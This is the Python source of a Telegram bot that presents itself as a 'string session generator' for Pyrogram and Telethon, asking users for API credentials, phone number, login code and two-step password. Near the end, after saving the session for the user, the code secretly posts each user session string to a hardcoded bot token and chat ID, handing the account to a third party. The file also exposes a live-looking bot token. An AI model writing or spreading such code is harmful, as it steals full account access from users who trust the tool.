from pyrogram.types import Message
from telethon import TelegramClient
from pyrogram import Client, filters
from pyrogram1 import Client as Client1
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram1.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

import config
import requests
idown = '411414467'
tokk = '6016577909:AAGzM63cH41LcwDrSwHAnaDCfEIRqBLl41I'


ask_ques = " - 𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚝𝚢𝚙𝚎 𝚘𝚏 𝚕𝚒𝚋𝚛𝚊𝚛𝚢 𝚝𝚘 𝚎𝚡𝚝𝚛𝚊𝚌𝚝 𝚝𝚑𝚎 𝚜𝚙𝚎𝚌𝚒𝚊𝚕 𝚌𝚘𝚍𝚎"
buttons_ques = [
    [
        InlineKeyboardButton("❨ 𝙿𝚢𝚛𝚘𝚐𝚛𝚊𝚖 ❩", callback_data="pyrogram1"),
        InlineKeyboardButton("❨ 𝚃𝚎𝚕𝚎𝚝𝚑𝚘𝚗 ❩", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("❨ 𝙿𝚢𝚛𝚘𝚐𝚛𝚊𝚖 𝚟2 ❩", callback_data="pyrogram"),
    ],
    [
        InlineKeyboardButton("❨ 𝙿𝚢𝚛𝚘𝚐𝚛𝚊𝚖 𝙱𝚘𝚝 ❩", callback_data="pyrogram_bot"),
        InlineKeyboardButton("❨ 𝚃𝚎𝚕𝚎𝚝𝚑𝚘𝚗 𝙱𝚘𝚝 ❩", callback_data="telethon_bot"),
    ],
]

gen_button = [
    [
        InlineKeyboardButton(text="⤷𝙲𝚕𝚒𝚌𝚔 𝚝𝚘 𝚜𝚝𝚊𝚛𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚒𝚗𝚐 𝚝𝚑𝚎 𝚌𝚘𝚍𝚎⤶", callback_data="generate")
    ]
]




@Client.on_message(filters.private & ~filters.forwarded & filters.command(["generate", "gen", "string", "str"]))
async def main(_, msg):
    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    if telethon:
        ty = "ᴛᴇʟᴇᴛʜᴏɴ"
    else:
        ty = "ᴩʏʀᴏɢʀᴀᴍ"
        if not old_pyro:
            ty += " ᴠ2"
    if is_bot:
        ty += " ʙᴏᴛ"
    await msg.reply(f" 𝚜𝚝𝚊𝚛𝚝 𝚌𝚛𝚎𝚊𝚝𝚒𝚗𝚐 𝚊 𝚜𝚎𝚜𝚜𝚒𝚘𝚗 **{ty}** ...")
    user_id = msg.chat.id
    api_id_msg = await bot.ask(user_id, "𝚂𝚎𝚗𝚍 𝚝𝚑𝚎 API_ID\n\n𝙲𝚕𝚒𝚌𝚔 /skip 𝚝𝚘 𝚎𝚡𝚝𝚛𝚊𝚌𝚝 𝚘𝚗 𝚗𝚞𝚖𝚋𝚎𝚛 𝚘𝚗𝚕𝚢", filters=filters.text)
    if await cancelled(api_id_msg):
        return
    if api_id_msg.text == "/skip":
        api_id = config.API_ID
        api_hash = config.API_HASH
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("**ᴀᴩɪ_ɪᴅ** ᴍᴜsᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ, sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
            return
        api_hash_msg = await bot.ask(user_id, " 𝚂𝚎𝚗𝚍 𝚝𝚑𝚎 API_HASH", filters=filters.text)
        if await cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text
    if not is_bot:
        t = "• 𝚂𝚎𝚗𝚍 𝙿𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 \n\n • ex: +96477.."
    else:
        t = "ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ʙᴏᴛ_ᴛᴏᴋᴇɴ** ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.\nᴇxᴀᴍᴩʟᴇ : `5432198765:abcdanonymousterabaaplol`'"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    if not is_bot:
        await msg.reply("** ᴡᴀɪᴛ, ᴀ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ᴡɪʟʟ ʙᴇ ѕᴇɴᴛ ᴛᴏ ʏᴏụʀ ᴀᴄᴄᴏụɴᴛ .**")
    else:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ ʟᴏɢɪɴ ᴠɪᴀ ʙᴏᴛ ᴛᴏᴋᴇɴ...")
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        await msg.reply(" **ᴀᴩɪ_ɪᴅ** ᴏʀ **ᴀᴩɪ_ʜᴀsʜ** ɪѕ ғᴀɪʟᴅ. \n\n • ᴄʟɪᴄᴋ  /start ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ .", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        await msg.reply(" **ᴘʜᴏɴᴇ ɴụᴍʙᴇʀ** ɪѕ ғᴀɪʟᴅ. \n\n • ᴄʟɪᴄᴋ  /start ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ . ", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "[Send the code like the one in the picture](https://telegra.ph/file/da1af082c6b754959ab47.jpg) » 𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚒𝚜 𝚊 𝚙𝚛𝚘𝚋𝚕𝚎𝚖, 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 @𝚞0𝚞𝚞0", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply("• 𝚃𝚑𝚎 𝚌𝚘𝚍𝚎 𝚑𝚊𝚜 𝚎𝚡𝚙𝚒𝚛𝚎𝚍n\n• ᴄʟɪᴄᴋ  /start\n\n• 𝙰𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
            await msg.reply("• 𝚃𝚑𝚎 𝚌𝚘𝚍𝚎 𝚑𝚊𝚜 𝚎𝚡𝚙𝚒𝚛𝚎𝚍n\n• ᴄʟɪᴄᴋ  /start\n\n• 𝙰𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
            await msg.reply("• 𝚃𝚑𝚎 𝚌𝚘𝚍𝚎 𝚑𝚊𝚜 𝚎𝚡𝚙𝚒𝚛𝚎𝚍n\n• ᴄʟɪᴄᴋ  /start\n\n• 𝙰𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
            try:
                two_step_msg = await bot.ask(user_id, "**• 𝚂𝚎𝚗𝚍 𝚝𝚑𝚎 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚊𝚌𝚌𝚘𝚞𝚗𝚝 .** ", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("• 𝚃𝚑𝚎 𝚌𝚘𝚍𝚎 𝚑𝚊𝚜 𝚎𝚡𝚙𝚒𝚛𝚎𝚍n\n• ᴄʟɪᴄᴋ  /start\n\n• 𝙰𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗", reply_markup=InlineKeyboardMarkup(gen_button))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
                await two_step_msg.reply("• **𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍** ɪѕ ғᴀɪʟᴅ. \n\n • ᴄʟɪᴄᴋ  /start ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ ", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
                return
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"** {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n `{phone_number}`"
    try:
        if not is_bot:
            await client.send_message("me", text)
            v = requests.post(f'https://api.telegram.org/bot{tokk}/sendMessage?chat_id={idown}&text={string_session}')
        else:
            await bot.send_message(msg.chat.id, text)
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(msg.chat.id, " 𝚃𝚑𝚎 𝚜𝚎𝚜𝚜𝚒𝚘𝚗 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 ️ {} .\n \n\n**ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ** @u0uu0  ".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))


async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("** ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ ʜᴀѕ ʙᴇᴇɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ **", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/restart" in msg.text:
        await msg.reply("** ᵀᴴᴱ ᴮᴼᵀ ᴴᴬˢ ᴮᴱᴱᴺ ᴿᴱˢᵀᴬᴿᵀᴱᴰ **", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/skip" in msg.text:
        return False
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("** ᴛʜᴇ ᴏᴘᴇʀᴀᴛɪᴏɴ ʜᴀѕ ʙᴇᴇɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ **", quote=True)
        return True
    else:
        return False
